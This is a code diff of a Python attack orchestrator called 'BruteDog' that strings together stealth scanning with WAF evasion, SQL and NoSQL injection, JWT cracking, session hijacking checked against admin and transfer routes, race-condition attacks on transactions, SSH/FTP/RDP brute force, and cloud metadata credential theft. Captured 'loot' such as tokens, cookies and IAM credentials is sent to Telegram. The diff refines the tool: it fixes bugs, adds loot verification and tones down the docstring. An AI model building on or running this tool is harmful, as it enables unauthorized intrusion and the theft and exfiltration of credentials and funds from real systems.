@@ -1,20 +1,12 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG V8.8 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE (Elite Red Team Adversarial Edition)
-Main Orchestrator:
-- Pre-flight DNS, target scope validation, and Poisson behavioral jitter initialization
-- Network reconnaissance & stealth port scanning with WAF-evading header rotation
-- Source intelligence & credential exposure parsing
-- Autonomous state-machine mapping, BOLA auditing, and HTTP/2 race condition exploitation
-- Live terminal streaming with zero-disk memory persistence & real-time loot interception
-- Integrated with asynchronous Telegram telemetry delivery across all attack vectors
+BRUTEDOG V8.8 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE
 """
 import asyncio
-import sys
-import socket
-import time
 import ipaddress
-import re
+import socket
+import sys
+import time
 from urllib.parse import urlsplit
 
 # Import framework modules
@@ -56,9 +48,6 @@ LOOT_YELLOW = "\033[38;5;220m"
 DIM = "\033[2m"
 RESET = "\033[0m"
 
-# ============================================================
-# BANNER (narrow width — fits iPhone iSH portrait)
-# ============================================================
 BANNER = f"""{MATRIX_GREEN}{BOLD}
   ╔╗ ╦═╗╦ ╦╺┳╸╔═╗╦═╗╔═╗╔═╗
   ╠╩╗╠╦╝║ ║ ┃ ╠═ ║ ║║ ║║ ╦
@@ -72,6 +61,8 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
 {NEON_BLUE}{DIM}  ──────────────────────────{RESET}
 """
 
+_background_tasks: set[asyncio.Task] = set()
+
 
 # ============================================================
 # TERMINAL OUTPUT HELPERS & LIVE EFFECTS
@@ -79,26 +70,31 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
 def log(message, color=GREEN):
     print(f"{color}{message}{RESET}", flush=True)
 
+
 def section(title):
     print()
     log("─" * 30, NEON_BLUE)
     log(f" {title}", BOLD)
     log("─" * 30, NEON_BLUE)
 
+
 def display_progress(message):
     print(f"{CYAN}[*] {message}{RESET}", flush=True)
 
-def type_line(text, color=GREEN, delay=0.015):
-    """Types text out character by character for a 'live terminal' feel."""
+
+def type_line(text, color=GREEN, delay=0.01):
+    """Types text out character by character for a live terminal feel."""
     sys.stdout.write(color)
     for char in text:
         sys.stdout.write(char)
         sys.stdout.flush()
-        time.sleep(delay)
+        if delay > 0:
+            time.sleep(delay)
     sys.stdout.write(RESET + "\n")
 
-def glitch_flash(text, color=RED, flashes=3, delay=0.05):
-    """Flickers text on/off for a 'glitch' intro effect."""
+
+def glitch_flash(text, color=RED, flashes=2, delay=0.04):
+    """Flickers text on/off for a brief intro effect."""
     for _ in range(flashes):
         sys.stdout.write(f"\r{color}{BOLD}{text}{RESET}")
         sys.stdout.flush()
@@ -108,11 +104,18 @@ def glitch_flash(text, color=RED, flashes=3, delay=0.05):
         time.sleep(delay / 2)
     sys.stdout.write(f"\r{color}{BOLD}{text}{RESET}\n")
 
-def alert_loot(loot_type, details):
+
+async def _dispatch_telegram(loot_type, details):
+    try:
+        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=10)
+    except Exception:
+        pass
+
+
+def alert_loot(loot_type, details, wait_for_send=False):
     """
-    Real-time on-the-fly loot notification banner for high-value discoveries 
-    (hijacked sessions, created accounts, cookies, secret tokens, private keys)
-    + Dispatches asynchronous Telegram alerts.
+    Real-time loot notification banner for verified discoveries
+    + Dispatches asynchronous Telegram alerts safely.
     """
     print(f"\n{LOOT_YELLOW}{BOLD}[!!!] CRITICAL LOOT DISCOVERED: {loot_type.upper()} [!!!]{RESET}")
     print(f"{LOOT_PURPLE}-----------------------------------------------------------------")
@@ -125,15 +128,68 @@ def alert_loot(loot_type, details):
 
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        task = loop.create_task(_dispatch_telegram(loot_type, details))
+        _background_tasks.add(task)
+        task.add_done_callback(_background_tasks.discard)
+        return task if wait_for_send else None
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(_dispatch_telegram(loot_type, details))
         except Exception:
             pass
+    return None
+
 
 # ============================================================
-# TARGET VALIDATION
+# VERIFICATION HELPERS (PREVENTS FALSE LOOT BANNERS)
+# ============================================================
+def has_verified_brute_loot(brute_loot):
+    if not brute_loot:
+        return []
+    items = brute_loot if isinstance(brute_loot, list) else [brute_loot]
+    verified = []
+    for entry in items:
+        if not isinstance(entry, dict):
+            continue
+        if (
+            entry.get("authenticated") is True
+            or entry.get("success") is True
+            or entry.get("cracked_credential") not in (None, "", False)
+            or entry.get("credential") not in (None, "", False)
+        ):
+            verified.append(entry)
+    return verified
+
+
+def has_verified_cloud_loot(cloud_loot):
+    if not isinstance(cloud_loot, dict):
+        return False
+    meta = cloud_loot.get("metadata_exposure") or {}
+    exfil = meta.get("exfiltrated_data") if isinstance(meta, dict) else None
+    return bool(cloud_loot.get("credentials_collected") is True or exfil)
+
+
+def has_verified_race_loot(race_loot):
+    if not isinstance(race_loot, dict):
+        return []
+    if race_loot.get("suppressed") is True or race_loot.get("waf_blocked") is True:
+        return []
+    findings = race_loot.get("findings") or []
+    verified = []
+    for item in findings:
+        if not isinstance(item, dict):
+            continue
+        if item.get("suppressed") is True or item.get("waf_challenge") is True:
+            continue
+        if item.get("verified") is True or (
+            item.get("severity") == "CRITICAL" and item.get("successful_streams", 0) > 1
+        ):
+            verified.append(item)
+    return verified
+
+
+# ============================================================
+# TARGET & DNS VALIDATION
 # ============================================================
 def normalize_target(raw_target):
     raw_target = raw_target.strip()
@@ -149,10 +205,8 @@ def normalize_target(raw_target):
     if parsed.username or parsed.password:
         raise ValueError("Embedded target credentials are not accepted.")
     hostname = parsed.hostname.encode("idna").decode("ascii").lower()
-    
     if not hostname:
         raise ValueError("Invalid target hostname.")
-        
     try:
         port = parsed.port or (443 if parsed.scheme == "https" else 80)
     except ValueError:
@@ -166,9 +220,7 @@ def normalize_target(raw_target):
         "url": f"{parsed.scheme}://{hostname}:{port}",
     }
 
-# ============================================================
-# DNS VALIDATION
-# ============================================================
+
 def validate_target_host(host):
     display_progress(f"Resolving target: {host}")
     try:
@@ -192,6 +244,7 @@ def validate_target_host(host):
         log(f"[DNS ERROR] {exc}", RED)
         return False, []
 
+
 # ============================================================
 # DISPLAY HELPERS FOR MODULE RESULTS
 # ============================================================
@@ -204,16 +257,17 @@ def display_scanner_results(result):
     for item in open_ports:
         log(f"[OPEN] TCP/{item.get('port')}", GREEN)
 
+
 def display_parser_results(result):
     if not isinstance(result, dict):
         return
     section("SOURCE INTELLIGENCE & EXPOSURE RESULTS")
     findings = result.get("findings", [])
     log(f"Findings detected: {len(findings)}")
-    
     for finding in findings:
         if any(keyword in str(finding).lower() for keyword in ["token", "key", "secret", "auth", "credential"]):
             alert_loot("Source Exposure / Secret Token", finding)
+
 
 # ============================================================
 # MAIN EXECUTION ORCHESTRATION
@@ -221,17 +275,13 @@ def display_parser_results(result):
 async def async_main():
     started = time.monotonic()
     print("\033[2J\033[H")
-    
-    # Run the immersive mobile-optimized startup sequence
-    glitch_flash("  INITIALIZING...", delay=0.06)
+
+    glitch_flash("  INITIALIZING...", delay=0.04)
     print(BANNER)
     type_line("  > booting modules", CYAN)
     type_line("  > cognitive handshake complete", GREEN)
     log("[SYSTEM] BruteDog Cognitive Orchestrator Initialized (v8.8 Elite Supremacy).")
 
-    # --------------------------------------------------------
-    # TARGET INPUT (Supports CLI argument or interactive prompt)
-    # --------------------------------------------------------
     if len(sys.argv) > 1:
         raw_target = sys.argv[1]
         log(f"[TARGET] Loaded target from command line argument: {raw_target}", CYAN)
@@ -250,7 +300,7 @@ async def async_main():
 
     hostname = target["hostname"]
     section("PRE-FLIGHT VALIDATION")
-    
+
     apply_behavioral_jitter()
     valid, addresses = validate_target_host(hostname)
     if not valid:
@@ -262,12 +312,9 @@ async def async_main():
     log(f"Port: {target['port']}")
     log(f"Protocol: {target['scheme'].upper()}")
 
-    # Initialize Cognitive Brain
     cognitive_brain = CognitiveOperator(target_url=target["url"])
+    use_ssl = target["scheme"] == "https"
 
-    # --------------------------------------------------------
-    # EXECUTION CONFIRMATION
-    # --------------------------------------------------------
     if len(sys.argv) <= 1:
         confirmation = input(
             f"\n{YELLOW}"
@@ -284,11 +331,12 @@ async def async_main():
     # PHASE 1 — NETWORK RECONNAISSANCE & STEALTH PROBING
     # --------------------------------------------------------
     section("PHASE 1 — NETWORK RECON & STEALTH OPS")
+    scanner_result = None
     try:
         display_progress("Executing stealth operations and security control assessment.")
         apply_behavioral_jitter()
         await run_stealth_engine(target["url"])
-        
+
         display_progress("Starting WAF-hardened TCP port assessment.")
         scanner_result = await run_port_scanner(hostname)
         display_scanner_results(scanner_result)
@@ -320,11 +368,15 @@ async def async_main():
         display_progress("Executing state-machine crawler, BOLA state-skipping checks, and cognitive telemetry engine.")
         apply_behavioral_jitter()
         engine_results, _ = await run_autonomous_engine(target_host=target["url"])
-        
+
         if isinstance(engine_results, list):
             for res in engine_results:
                 for finding in res.get("findings", []):
-                    if "BYPASS" in finding.get("type", "") or "TOKEN" in finding.get("type", ""):
+                    if (
+                        not finding.get("suppressed")
+                        and not finding.get("waf_challenge")
+                        and ("BYPASS" in finding.get("type", "") or "TOKEN" in finding.get("type", ""))
+                    ):
                         alert_loot("Authentication Bypass / Token Acquired", finding)
 
         display_progress("Replaying secondary attack queue & executing session token fabrication.")
@@ -339,25 +391,25 @@ async def async_main():
     try:
         display_progress("Executing time-based blind SQLi and polymorphic NoSQL operator injection.")
         apply_behavioral_jitter()
-        nosql_loot = await run_nosql_assault(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        nosql_loot = await run_nosql_assault(target["url"], port=target["port"], use_ssl=use_ssl)
         if nosql_loot:
             alert_loot("Database Assault Breach / Credential Dump", nosql_loot)
 
         display_progress("Executing JWT secret cracking, algorithm downgrade, and cookie privilege escalation fuzzing.")
-        session_loot = await run_session_hijack(target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"))
+        session_loot = await run_session_hijack(target["url"], port=target["port"], use_ssl=use_ssl)
         if session_loot:
             alert_loot("Hijacked Session / Valid Cookie Jar", session_loot)
-            
+
             display_progress("Verifying hijacked session live against target protected routes...")
             cookie_jar_to_test = session_loot.get("cookies") if isinstance(session_loot, dict) else {}
             token_to_test = session_loot.get("token") if isinstance(session_loot, dict) else None
-            
+
             for route in ["/admin", "/dashboard", "/api/user/profile", "/transfer"]:
                 verified = execute_live_login_verification(
                     target_url=target["url"],
                     endpoint=route,
                     cookie_dict=cookie_jar_to_test,
-                    token=token_to_test
+                    token=token_to_test,
                 )
                 if verified:
                     log(f"[+] Loot successfully verified and streamed on-screen from {route}!", GREEN)
@@ -365,12 +417,15 @@ async def async_main():
 
         display_progress("Firing HTTP/2 single-packet multiplexed streams against transaction race condition windows.")
         apply_behavioral_jitter()
-        race_loot = await run_race_condition_test(target_url=target["url"], port=target["port"], use_ssl=(target["scheme"] == "https"), session_pool=None)
-        if race_loot and isinstance(race_loot, dict):
-            findings_list = race_loot.get("findings", [])
-            successful_races = [r for r in findings_list if r.get("severity") == "CRITICAL" or r.get("successful_streams", 0) > 1]
-            if successful_races:
-                alert_loot("Race Condition Transfer / Execution Success", successful_races)
+        race_loot = await run_race_condition_test(
+            target_url=target["url"],
+            port=target["port"],
+            use_ssl=use_ssl,
+            session_pool=None,
+        )
+        verified_races = has_verified_race_loot(race_loot)
+        if verified_races:
+            alert_loot("Race Condition Transfer / Execution Success", verified_races)
     except Exception as exc:
         log(f"[EXPLOIT/CONCURRENCY ERROR] {exc}", RED)
 
@@ -382,8 +437,9 @@ async def async_main():
         display_progress("Launching multi-protocol brute-force (SSH, FTP, RDP, XML-RPC).")
         apply_behavioral_jitter()
         brute_loot = await execute_active_assault_engine(target["url"])
-        if brute_loot:
-            alert_loot("Valid Service Credentials", brute_loot)
+        verified_creds = has_verified_brute_loot(brute_loot)
+        if verified_creds:
+            alert_loot("Valid Service Credentials", verified_creds)
     except Exception as exc:
         log(f"[BRUTE ERROR] {exc}", RED)
 
@@ -395,7 +451,7 @@ async def async_main():
         display_progress("Executing cloud control plane pivot and IMDS metadata exfiltration.")
         apply_behavioral_jitter()
         cloud_loot = await run_cloud_apex(target["url"])
-        if cloud_loot:
+        if has_verified_cloud_loot(cloud_loot):
             alert_loot("Cloud Metadata / IAM Credentials", cloud_loot)
 
         display_progress("Running autonomous pivot engine and covert exfiltration preparation.")
@@ -419,15 +475,14 @@ async def async_main():
     log("LIVE RED-TEAM ATTACK FINISHED", MATRIX_GREEN)
     log("All intelligence, hijacked sessions, and keys streamed live on-screen.", NEON_BLUE)
     log("Zero report files written to disk. Zero external emails sent.", NEON_BLUE)
-    
-    try:
-        loop = asyncio.get_running_loop()
-        loop.create_test(send_telegram_alert("BruteDog Assessment Complete", {"target": target['url'], "duration": f"{elapsed:.2f}s"}))
-    except RuntimeError:
-        try:
-            asyncio.run(send_telegram_alert("BruteDog Assessment Complete", {"target": target['url'], "duration": f"{elapsed:.2f}s"}))
-        except Exception:
-            pass
+
+    await _dispatch_telegram(
+        "BruteDog Assessment Complete",
+        {"target": target["url"], "duration": f"{elapsed:.2f}s"},
+    )
+    if _background_tasks:
+        await asyncio.gather(*list(_background_tasks), return_exceptions=True)
+
 
 # ============================================================
 # ENTRY POINT
@@ -439,6 +494,7 @@ def main():
         log("\n[INTERRUPTED] Assessment stopped by operator.", YELLOW)
     except Exception as exc:
         log(f"\n[FATAL ERROR] {exc}", RED)
+
 
 if __name__ == "__main__":
     main()
